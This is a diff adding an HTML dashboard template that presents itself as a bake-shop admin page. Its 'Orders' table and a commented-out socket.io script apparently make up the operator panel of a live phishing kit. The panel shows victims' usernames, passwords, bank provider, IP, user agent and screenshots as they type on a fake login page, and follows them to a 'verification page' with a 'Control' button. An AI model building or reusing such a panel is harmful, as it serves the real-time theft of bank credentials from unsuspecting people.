@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <link rel="stylesheet" type="text/css" href="/static/dashboard.css">
+      <script src="https://kit.fontawesome.com/243ba828f2.js" crossorigin="anonymous"></script>
+    <script src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
+        integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+        integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+        integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+        crossorigin="anonymous"></script>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"
+        integrity="sha384-7EyYLQZgWBi67fBtVxw60/OWl1kjsfrPFcaU0pp0nAh+i8FD068QogUvg85Ewy1k"
+        crossorigin="anonymous"></script>
+    
+
+    <meta charset="UTF-8">
+    <title>Dashboard</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <script>
+        /*   $(document).ready(function () {
+         let socket = io.connect('http://localhost:8080');
+
+            $("#spam-options").click(function () {
+                $("#exampleModalCenter").modal('show');
+            })
+            $('#myModal').on('shown.bs.modal', function () {
+                $('#myInput').trigger('focus')
+            })
+            socket.on("connect", function () {
+                socket.emit("admin_connected", {{ user.admin }});
+
+            socket.on("user_loginpage", function (user) {
+                console.log(user.ip);
+                console.log(user.userAgent);
+                var addrow = "<div class='each-user'>" +
+                    "<div id='" + user.id + "-username' class='equal-log-columns begin-text username'>" + user.username + "</div>" +
+                    "<div id='" + user.id + "-password' class='equal-log-columns center-text password'>" + user.password + "</div>" +
+                    "<div id='" + user.id + "-status' class='equal-log-columns center-text  status'>" + user.status + "</div> " +
+                    "<div id='" + user.id + "-page' class='equal-log-columns center-text pageHost'>" + user.page + "</div>" +
+                    "<div id='" + user.id + "-bank' class='equal-log-columns center-text  bank'>" + user.provider + "</div>" +
+                    "<div id='" + user.id + "-ip' class='equal-log-columns center-text ip'>" + user.ip + "</div>" +
+                    "<div id='" + user.id + "-userAgent' class='equal-log-columns center-text userAgent'>" + user.userAgent + " </div>" +
+                    "<div id='" + user.id + "-address' class='equal-log-columns center-text address'> N/A </div>" +
+                    "<div id='" + user.id + "-screenshot' class='equal-log-columns center-text screenshot'><a href=''>N/A.png</a></div>" +
+                    "<div class='equal-log-columns center-text control'>" +
+                    "<div id='" + user.id + "-control' class='control-button'>" +
+                    "<div class='control-button-circle'></div>" +
+                    "Control</div></div></div>";
+                $(".login-rows").append(addrow);
+
+
+
+            });
+
+            socket.on("dashboard_enteringuser", function (user) {
+                $("#" + user.id + "-status").text("Entering Username...");
+            });
+
+            socket.on("dashboard_entereduser", function (user) {
+                console.log("Entered user" + user.user);
+                $("#" + user.id + "-username").text(user.user);
+                $("#" + user.id + "-status").text("Entered Username");
+            });
+
+
+            socket.on("dashboard_enteringpassword", function (user) {
+                $("#" + user.id + "-status").text("Entering Password...");
+            });
+
+            socket.on("dashboard_enteredpassword", function (user) {
+                console.log("Entered pass");
+                $("#" + user.id + "-password").text(user.password);
+                $("#" + user.id + "-status").text("Entered Password");
+            });
+
+            socket.on("dashboard_hitsubmit", function (user) {
+                $("#" + user.id + "-status").text("On verification page...");
+            });
+
+        })
+                    }) */
+
+    </script>
+
+</head>
+<body>
+
+    <div class = "navbar-dashboard">
+            <div class = "company"> 
+                <div class = "company-logo">
+                    
+                </div>
+                <div class = "company-name">
+                    DOYDOY's BAKE SHOP
+                </div>
+            </div>
+            <div class = "dashboard-menu">
+                <div class="dashboard-menu-options">
+
+                    <div class="d-menu-options-header">
+                        <div class = "d-menu-options-icon">
+                            
+                            <i class="fa-sharp fa-solid fa-list white"></i>
+                        </div>
+                        <div class="d-menu-options-text-header">NAVIGATION</div>
+                    </div>
+                    <a href="/"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            
+                            <i class="fa-sharp fa-solid fa-desktop white"></i>
+                        </div>
+                        <div class="d-menu-options-text"> M a i n  &nbsp; D a s h</div>
+                    </a>
+                    <a href="/dashboard/products"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            <i class=" fa-sharp fa-solid fa-box white"></i>
+                        </div>
+                        <div class="d-menu-options-text"> P r o d u c t s</div>
+                    </a>
+                    
+                    <a href="/"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            <i class="fa-sharp fa-solid fa-boxes-packing white"></i>
+                        </div>
+                        
+                        <div class="d-menu-options-text"> O r d e r s</div>
+                    </a>
+
+
+                    <a href="/"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            <i class="fa-sharp fa-solid fa-dollar-sign white"></i>
+                        </div>
+                        
+                        <div class="d-menu-options-text"> E a r n i n g s</div>
+                    </a>
+                    
+
+
+
+
+                    <a href="/"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            <i class="fa-sharp fa-solid fa-users white"></i>
+                        </div>
+                        
+                        <div class="d-menu-options-text">A c c o u n t s</div>
+                    </a>
+                    
+                    <a href="/dashboard/visitors"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            <i class="fa-sharp fa-solid fa-user-secret white"></i>
+                        </div>
+                        
+                        <div class="d-menu-options-text">V i s i t o r s</div>
+                    </a>
+                    
+                    <a href="/"class="d-menu-options">
+                        <div class = "d-menu-options-icon">
+                            <i class="fa-sharp fa-solid fa-gears white"></i>
+                        </div>
+                        
+                        <div class="d-menu-options-text"> O p t i o n s</div>
+                    </a>
+                    
+        
+                </div>
+                    <a href ="/" class="d-menu-options-logout">
+                        <div class = "d-menu-options-icon">
+                            <i class="fa-sharp fa-solid fa-door-open white"></i>
+                        </div>
+                        
+                        <div class="d-menu-options-text"> L O G &nbsp; O U T</div>
+                    </a>
+
+            </div>
+
+        </div>
+    <div class = "page">
+
+        <div class="dashcontent">
+            <div class = "header">
+                <div class = "divider-header">
+
+                <div class = "circle ">
+
+                </div>
+                <div class = "header-options-logo"> 
+                    Dashboard
+                </div>
+
+
+
+                </div> 
+            </div> 
+            
+            <div class ="dashboard">
+                <div class = "dashboard-uppersection">
+                                <div class = "visitors">
+                    <div class = "feature-content">
+                        <div class = "upper-section white">
+                            V i s i t o r s 
+                        </div>
+                        <div class="mid-section-total">
+                            <div class = "mid-Section white">
+                            60
+                            </div>
+                            <div class = "mid-lower-Section ">
+                            + 40%
+                            </div>
+
+                        </div>                       
+                         <div class = "lower-section white">
+                            I n &nbsp;&nbsp; t h e &nbsp;&nbsp; l a s t &nbsp;&nbsp; 2 4 &nbsp;&nbsp; h o u r s
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class = "orders">
+                    <div class = "feature-content">
+                        <div class = "upper-section black">
+                            R E V E N U E 
+                        </div>
+                       
+                        <div class="mid-section-total">
+                            <div class = "mid-Section black ">
+                             $ 565.32
+                            </div>
+                            <div class = "mid-lower-Section ">
+                            + 40%
+                            </div>
+
+                        </div>                       
+                         <div class = "lower-section black">
+                            I n &nbsp;&nbsp; t h e &nbsp;&nbsp; l a s t &nbsp;&nbsp; 2 4 &nbsp;&nbsp; h o u r s
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class = "orders">
+                    <div class = "feature-content">
+                        <div class = "upper-section black">
+                            O R D E R S
+                        </div>
+                        <div class="mid-section-total">
+                            <div class = "mid-Section black ">
+                            34
+                            </div>
+                            <div class = "mid-lower-Section ">
+                            + 54%
+                            </div>
+
+                        </div>                       
+                         <div class = "lower-section black">
+                            I n &nbsp;&nbsp; t h e &nbsp;&nbsp; l a s t &nbsp;&nbsp; 2 4 &nbsp;&nbsp; h o u r s
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class = "orders">
+                    <div class = "feature-content">
+                        <div class = "upper-section black">
+                            O R D E R S
+                        </div>
+                        <div class="mid-section-total">
+                            <div class = "mid-Section black ">
+                            34
+                            </div>
+                            <div class = "mid-lower-Section ">
+                            + 54%
+                            </div>
+
+                        </div>                       
+                         <div class = "lower-section black">
+                            I n &nbsp;&nbsp; t h e &nbsp;&nbsp; l a s t &nbsp;&nbsp; 2 4 &nbsp;&nbsp; h o u r s
+                        </div>
+
+                    </div>
+                </div>
+
+                </div>
+
+                <div class="dashboard-middlesection">
+                    <div class="chart-analytics ">
+
+                    </div>
+                    <div class="chart-analytics ">
+
+                    </div>
+
+                </div>
+
+                
+                <div class="dashboard-lowersection">
+                    <div class="dashchart">
+                        <div class ="table-header-full">
+                            <div class = "table-header-upper"> O R D E R S</div>
+                            <div class="table-header-all">
+                                <div class="table-header center-text">Username</div>
+                                <div class="table-header center-text">Password</div>
+                                <div class="table-header center-text">Status</div>
+                                <div class="table-header center-text">Page</div>
+                                <div class="table-header center-text">Provider</div>
+                                <div class="table-header center-text">IP</div>
+                                <div class="table-header-userAgent center-text">User Agent</div>
+                                <div class="table-header center-text">Address</div>
+                                <div class="table-header center-text">Screenshot</div>
+                                <div class="table-header end-text"></div>
+                            </div>
+                        </div>
+
+                    <div class="login-rows">
+                        
+                        <div class="each-user">
+                            <div id='-username' class="equal-log-columns begin-text username">
+                                haha</div>
+                            <div id='-password' class="equal-log-columns center-text password">
+                                haha</div>
+                            <div id='-status' class="equal-log-columns center-text  status">
+                               haha </div>
+                            <div id='-page' class="equal-log-columns center-text pageHost">
+                               haha </div>
+                            <div id='-bank' class="equal-log-columns center-text  bank">
+                                </div>
+                            <div id='-ip' class="equal-log-columns center-text ip">
+                               haha </div>
+                            <div id='-userAgent' class="center-text userAgent">
+                                </div>
+                            <div id='-address' class="equal-log-columns center-text address">
+                                haha</div>
+                            <div class="equal-log-columns center-text screenshot"><a href="">N/A.png</a></div>
+                            <div class="equal-log-columns center-text control">
+                                <div id='-control' class="control-button">
+                                    <div class="control-button-circle"></div>
+                                    Control
+                                </div>
+                            </div>
+                        </div>
+                                                <div class="each-user">
+                            <div id='-username' class="equal-log-columns begin-text username">
+                                haha</div>
+                            <div id='-password' class="equal-log-columns center-text password">
+                                haha</div>
+                            <div id='-status' class="equal-log-columns center-text  status">
+                               haha </div>
+                            <div id='-page' class="equal-log-columns center-text pageHost">
+                               haha </div>
+                            <div id='-bank' class="equal-log-columns center-text  bank">
+                                </div>
+                            <div id='-ip' class="equal-log-columns center-text ip">
+                               haha </div>
+                            <div id='-userAgent' class="center-text userAgent">
+                                </div>
+                            <div id='-address' class="equal-log-columns center-text address">
+                                haha</div>
+                            <div class="equal-log-columns center-text screenshot"><a href="">N/A.png</a></div>
+                            <div class="equal-log-columns center-text control">
+                                <div id='-control' class="control-button">
+                                    <div class="control-button-circle"></div>
+                                    Control
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    </div>
+                        
+
+                    </div>
+
+
+
+            </div>
+
+        
+
+        </div>
+
+
+
+
+    </div>
+    </div>
+
+   
+
+
+
+</body>
+
+</html>
